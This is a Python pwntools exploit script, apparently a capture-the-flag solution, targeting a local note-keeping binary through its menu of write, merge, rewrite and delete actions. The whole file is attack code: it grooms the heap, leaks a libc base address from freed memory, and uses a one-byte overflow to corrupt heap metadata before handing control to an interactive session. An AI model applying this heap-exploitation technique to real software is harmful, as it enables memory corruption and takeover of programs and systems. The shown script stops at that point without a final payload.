from pwn import *
context.arch='amd64'
r = process('./P',env={"LD_PRELOAD": "./libc.so.6"})

def read_note(idx):
    r.sendlineafter(b'> ',b'1')
    r.sendlineafter(b'page? ',str(idx).encode())


def write_rdonly_note(idx,size,content):
    r.sendlineafter(b'> ',b'2')
    r.sendlineafter(b'page? ',str(idx).encode())
    r.sendlineafter(b'Size? ',str(size).encode())
    r.sendafter(b'Content: \n',content)

def write_rdwr_note(idx,size,content):
    r.sendlineafter(b'> ',b'3') 
    r.sendlineafter(b'page? ',str(idx).encode())
    r.sendlineafter(b'Size? ',str(size).encode())
    r.sendafter(b'Content: \n',content)

def rewrite_rdwr_note(idx,content):
    r.sendlineafter(b'> ',b'4')
    r.sendlineafter(b'page? ',str(idx).encode())
    r.sendlineafter(b'Content: \n',content)


def merge_rdonly_note(dst,src):
    r.sendlineafter(b'> ',b'5')
    r.sendlineafter(b'dest? ',str(dst).encode())
    r.sendlineafter(b'src? ',str(src).encode())

def delete_note(idx):
    r.sendlineafter(b'> ',b'6')
    r.sendlineafter(b'page? ',str(idx).encode())


for i in range(7):
    write_rdonly_note(i,0xbf,b'1'*0xbf)

for i in range(1,7):
    merge_rdonly_note(0,i)

write_rdonly_note(1,0x28,b'1')  # 1
delete_note(0)

write_rdonly_note(2,0x28,b'1') # 2
read_note(2)

r.recvline()
libc = u64(r.recv(6) + b'\x00\x00') - 0x1ed031
print(hex(libc))

write_rdwr_note(0,0x38,b'1'*0x37) # 0
merge_rdonly_note(0,1)

rewrite_rdwr_note(0,b'a'*0x38 + b'\xa0')
write_rdwr_note(0,0x38,b'1'*0x37)

r.interactive()